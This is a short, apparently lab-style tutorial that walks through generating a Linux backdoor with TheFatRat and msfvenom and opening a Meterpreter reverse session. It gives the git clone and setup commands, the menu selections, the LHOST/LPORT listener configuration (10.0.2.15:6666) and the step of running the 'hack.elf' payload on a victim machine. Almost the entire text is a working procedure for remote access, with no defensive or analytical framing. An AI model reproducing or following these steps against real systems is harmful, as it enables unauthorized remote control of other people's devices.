This attack is based on running TheFatRat exploit to create a payload that creates a server allowing remote access to the device. Note: I ran this on kali linux because it has metasploit installed already so downloading this on a different operating system could effect its ability to download.

1. Open terminal and use following commands to clone TheFatRat from github
git clone https://github.com/Screetsec/TheFatRat.git
cd TheFatRat
chmod +x setup.sh && ./setup.sh

2. After downloading enter FatRat and update using
cd TheFatRat
./update && chmod +x setup.sh && ./setup.sh

3. Now that you have TheFatRat up and running select the "Create Backdoor with msfvenom"
1

4. Now choose type of system you are attacking in this case linux
1

5. Replace LHOST with your local ip address. Set LPORT to port of my choice and give the payload a name.
Set LHOST IP: 10.0.2.15
Set LPORT: 6666
Please enter the base name for output files: hack

6. choose payload according to OS of victim system I was doing linux so
3

Payload should be generated and in output folder

7. Open new terminal and rerun fatrat
./fatrat

8. Now to create the listener select "Load/Create auto listeners"
9

9. Choose system you want to create the listener for in this case linux
1

10. Choose same payload type you used for exectuable
3

11. Fill LHOST and LPORT with same info from payload

Set LHOST IP: 10.0.2.15
Set LPORT: 6666
Do you want to save this configuration to use in the future: y
Write the name for this config: linuxListener

12. Now that its created select "load a saved listener"
5

13. give file name of desired listener
filename: linuxListener.rc

msfconsole should deploy

14. turn payload into executable
chmod +x hack.elf

15. run executable on victim machine
./hack.elf

Meterpreter Session Should be open. Success
